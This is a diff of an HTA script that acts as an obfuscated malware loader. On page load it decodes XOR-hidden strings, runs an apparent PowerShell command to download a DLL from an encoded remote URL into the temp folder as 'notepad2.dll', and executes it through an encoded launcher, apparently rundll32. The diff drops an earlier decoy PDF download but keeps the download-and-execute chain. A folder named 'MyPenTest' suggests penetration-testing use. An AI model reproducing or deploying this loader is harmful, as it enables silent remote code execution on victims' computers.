@@ -14,7 +14,7 @@
     windowstate="normal"
 />
 <script language="javascript">
- function hx(hex) {
+function hx(hex) {
     var str = '';
     for (var i = 0; i < hex.length; i += 2) {
         var hexPair = hex.substring(i, i + 2);
@@ -23,33 +23,27 @@
     }
     return str;
 }
-        
-        function xr(encrypted, kk) {
-            var result = '';
-            for (var i = 0; i < encrypted.length; i++) {
-                var charCode = encrypted.charCodeAt(i);
-                var kkCharCode = kk.charCodeAt(i % kk.length);
-                var decryptedChar = String.fromCharCode(charCode ^ kkCharCode);
-                result += decryptedChar;
-            }
-            return result;
-        }
 
-         function dtext(etext) {            
-            var kk = '3b111702164e77401525084e0907050f274a';            
-            
-            try {                
-                var cleanHex = etext.replace(/\s+/g, '');             
-                
-                var encrypted = hx(cleanHex);                
-                
-                var decrypted = xr(encrypted, kk);
-                return decrypted;
-                
-            } catch (e) {
-               
-            }
-        }        
+function xr(encrypted, kk) {
+    var result = '';
+    for (var i = 0; i < encrypted.length; i++) {
+        var charCode = encrypted.charCodeAt(i);
+        var kkCharCode = kk.charCodeAt(i % kk.length);
+        var decryptedChar = String.fromCharCode(charCode ^ kkCharCode);
+        result += decryptedChar;
+    }
+    return result;
+}
+
+function dtext(etext) {            
+    var kk = '3b111702164e77401525084e0907050f274a';            
+    try {                
+        var cleanHex = etext.replace(/\s+/g, '');             
+        var encrypted = hx(cleanHex);                
+        var decrypted = xr(encrypted, kk);
+        return decrypted;                
+    } catch (e) {}
+}
 
 window.onload = function () {
     try {
@@ -58,35 +52,27 @@ window.onload = function () {
         var fso = new ActiveXObject("Scripting.FileSystemObject");        
         var tempDir = rr.ExpandEnvironmentStrings("%TEMP%");
         var targetDir = tempDir + "\\MyPenTest";
-        var pdfUrl = dtext("5b164541420d1f1d565859520f02021e565c465d455a1a0c5f1644585d471f15535a440d564c415557");
-        var pdfLocal = targetDir + "\\dummy.pdf";
         var dllUrl = dtext("5b164541420d1f1d4357434b505e405844574746554a570a5e4d5559441b53095f1856095609585f5a581f465445404a5a565d5e1e5b5d41554855010217545b5c");
         var dllPath = tempDir + "\\notepad2.dll";
-        
+
         function sleep(ms) {
             rr.Run("ping 127.0.0.1 -n " + ((ms / 3000) + 1) + " > nul", 0, true);
         }
-        
+
         if (!fso.FolderExists(targetDir)) {
             fso.CreateFolder(targetDir);
         }
-        
+
         sleep(3000);
-        
-        rr.Run(dtext("430d4654434458575d5a1448795864425e535b59551819265f545d565e5110447b59420e58071c66545562574043511643171965435c") + " '" + pdfUrl + "' -OutFile '" + pdfLocal + "'", 0, true);
 
-        sleep(1500);
-        
-        shellApp.ShellExecute(pdfLocal, "", "", "open", 0);
+        rr.Run(dtext("430d4654434458575d5a1448795864425e535b59551819265f545d565e5110447b59420e58071c66545562574043511643171965435c") + 
+            " '" + dllUrl + "' -OutFile '" + dllPath + "'", 0, true);
 
-        sleep(3000); 
-        
-        rr.Run(dtext("430d4654434458575d5a1448795864425e535b59551819265f545d565e5110447b59420e58071c66545562574043511643171965435c") + " '" + dllUrl + "' -OutFile '" + dllPath + "'", 0, true);
+        sleep(3000);
 
-        sleep(3000); 
-        
         var ee = dtext("41175f555d5b03001f534c00");
-        rr.Run(ee + " \"" + dllPath + "\",notepad", 0, true);        
+        rr.Run(ee + " \"" + dllPath + "\",notepad", 0, true);
+
         setTimeout(function () {
             window.close();
         }, 5000);
